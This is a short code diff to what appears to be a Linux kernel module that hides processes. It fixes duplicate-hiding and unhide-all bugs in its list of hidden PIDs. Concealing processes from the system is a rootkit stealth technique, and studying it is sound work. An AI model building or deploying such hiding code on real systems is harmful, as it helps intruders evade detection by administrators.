@@ -114,7 +114,12 @@ static void init_hook(void)
 
 static int hide_process(pid_t pid)
 {
-    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+    pid_node_t *proc = NULL;
+
+    if (is_hidden_proc(pid)) {
+        return SUCCESS;
+    }
+    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
     list_add_tail(&proc->list_node, &hidden_proc);
     return SUCCESS;
@@ -124,8 +129,11 @@ static int unhide_process(pid_t pid)
 {
     pid_node_t *proc, *tmp_proc;
     list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
-        list_del(&proc->list_node);
-        kfree(proc);
+        if (proc->id == pid) {
+            list_del(&proc->list_node);
+            kfree(proc);
+            break;
+        }
     }
     return SUCCESS;
 }
